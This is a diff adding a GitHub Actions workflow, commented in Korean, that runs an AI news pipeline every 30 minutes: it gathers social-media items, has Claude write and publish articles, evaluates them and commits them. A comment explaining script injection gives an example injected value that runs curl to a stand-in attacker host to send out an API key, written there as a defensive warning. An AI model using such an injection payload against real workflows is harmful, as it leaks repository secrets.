@@ -1,0 +1,131 @@
+name: 수집 및 발행
+
+on:
+  schedule:
+    # 30분마다. 속보성이 이 사이트의 핵심 경쟁력이므로 촘촘하게 돈다.
+    # (GitHub Actions 의 cron 은 UTC 기준이며, 부하 상황에 따라 수 분 늦게 실행될 수 있다.)
+    - cron: '*/30 * * * *'
+  workflow_dispatch:
+    inputs:
+      limit:
+        description: '이번 실행에서 쓸 기사 수'
+        required: false
+        default: '3'
+      force:
+        description: '화제성/중복 기준 무시 (true/false)'
+        required: false
+        default: 'false'
+
+# 동시에 두 번 돌면 같은 뉴스를 두 번 쓰거나 커밋이 충돌한다.
+concurrency:
+  group: publish
+  cancel-in-progress: false
+
+permissions:
+  contents: write
+
+jobs:
+  publish:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: '22'
+          cache: npm
+
+      - run: npm ci
+
+      # ── 인증 방식 결정 ────────────────────────────────────────────────
+      # CLAUDE_CODE_OAUTH_TOKEN 이 있으면 Claude 구독으로 돌린다(추가 과금 없음).
+      # 없으면 ANTHROPIC_API_KEY 로 API 를 쓴다. 둘 다 없으면 여기서 멈춘다 —
+      # 뒤에서 실패하면 원인을 찾기 어렵다.
+      - name: 인증 방식 결정
+        id: auth
+        env:
+          OAUTH: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
+          APIKEY: ${{ secrets.ANTHROPIC_API_KEY }}
+        run: |
+          if [ -n "$OAUTH" ]; then
+            echo "backend=cli" >> "$GITHUB_OUTPUT"
+            echo "구독 인증(CLAUDE_CODE_OAUTH_TOKEN) 사용"
+          elif [ -n "$APIKEY" ]; then
+            echo "backend=api" >> "$GITHUB_OUTPUT"
+            echo "API 키(ANTHROPIC_API_KEY) 사용"
+          else
+            echo "::error::CLAUDE_CODE_OAUTH_TOKEN 또는 ANTHROPIC_API_KEY 중 하나를 저장소 Secret 에 등록하세요."
+            exit 1
+          fi
+
+      # 구독 방식일 때만 Claude Code CLI 를 설치한다. API 방식에서는 불필요한 설치 시간이다.
+      - name: Claude Code 설치
+        if: steps.auth.outputs.backend == 'cli'
+        run: npm install -g @anthropic-ai/claude-code
+
+      - name: 수집 → 집필 → 발행
+        env:
+          # 구독 방식
+          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
+          # API 방식
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+
+          LLM_BACKEND: ${{ steps.auth.outputs.backend }}
+          LLM_MODEL: ${{ vars.LLM_MODEL || 'claude-opus-5' }}
+
+          REDDIT_CLIENT_ID: ${{ secrets.REDDIT_CLIENT_ID }}
+          REDDIT_CLIENT_SECRET: ${{ secrets.REDDIT_CLIENT_SECRET }}
+          REDDIT_USER_AGENT: ${{ vars.REDDIT_USER_AGENT }}
+          NAVER_CLIENT_ID: ${{ secrets.NAVER_CLIENT_ID }}
+          NAVER_CLIENT_SECRET: ${{ secrets.NAVER_CLIENT_SECRET }}
+          X_BEARER_TOKEN: ${{ secrets.X_BEARER_TOKEN }}
+          FACEBOOK_PAGE_TOKEN: ${{ secrets.FACEBOOK_PAGE_TOKEN }}
+          FACEBOOK_PAGE_IDS: ${{ vars.FACEBOOK_PAGE_IDS }}
+
+          # 수동 실행 입력은 반드시 env 로 받는다.
+          # run: 안에 ${{ }} 로 직접 넣으면 셸이 읽기 전에 문자열이 치환되어,
+          # limit 에 `3"; curl attacker/$API_KEY; echo "` 같은 값을 넣는 것만으로
+          # 이 스텝의 시크릿을 가진 채 임의 명령이 실행된다(스크립트 인젝션).
+          RUN_LIMIT: ${{ github.event.inputs.limit || '3' }}
+          RUN_FORCE: ${{ github.event.inputs.force || 'false' }}
+        run: |
+          case "$RUN_LIMIT" in
+            ''|*[!0-9]*) echo "::error::limit 은 숫자여야 합니다 (받은 값: $RUN_LIMIT)"; exit 1 ;;
+          esac
+
+          args=(--limit "$RUN_LIMIT")
+          [ "$RUN_FORCE" = "true" ] && args+=(--force)
+
+          npx tsx pipeline/cli.ts run "${args[@]}"
+
+      # 방금 낸 기사를 평가해 둔다. 결과는 data/reviews.json 에 쌓이고,
+      # 다음 실행의 집필 프롬프트에 '이번에 특히 신경 쓸 것'으로 자동 반영된다.
+      # 평가가 실패해도 기사 발행은 이미 끝났으므로 워크플로를 죽이지 않는다.
+      - name: 기사 품질 평가
+        continue-on-error: true
+        env:
+          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
+          ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          LLM_BACKEND: ${{ steps.auth.outputs.backend }}
+          LLM_MODEL: ${{ vars.LLM_MODEL || 'claude-opus-5' }}
+        run: npx tsx pipeline/cli.ts evaluate
+
+      - name: 변경 사항 커밋
+        run: |
+          git config user.name  "ai-news-bot"
+          git config user.email "bot@users.noreply.github.com"
+          # 개별 경로를 나열하면 아직 생성되지 않은 파일 하나 때문에 git add 가 exit 128 로
+          # 죽고, 방금 LLM 을 돌려 만든 기사가 커밋되지 않은 채 워크플로가 실패한다.
+          # (data/geeknews-links.json 은 GeekNews 요청이 전부 차단되면 생성되지 않는다.)
+          git add content/posts data || true
+          if git diff --staged --quiet; then
+            echo "발행할 새 글 없음 — 커밋 생략"
+            exit 0
+          fi
+          count=$(git diff --staged --name-only -- content/posts | wc -l)
+          git commit -m "기사 ${count}건 발행 ($(date -u '+%Y-%m-%d %H:%M UTC'))"
+          # 30분 주기라 그사이 원격이 앞서 있을 수 있다. rebase 후 push.
+          git pull --rebase --autostash origin "${GITHUB_REF_NAME}"
+          git push origin "HEAD:${GITHUB_REF_NAME}"
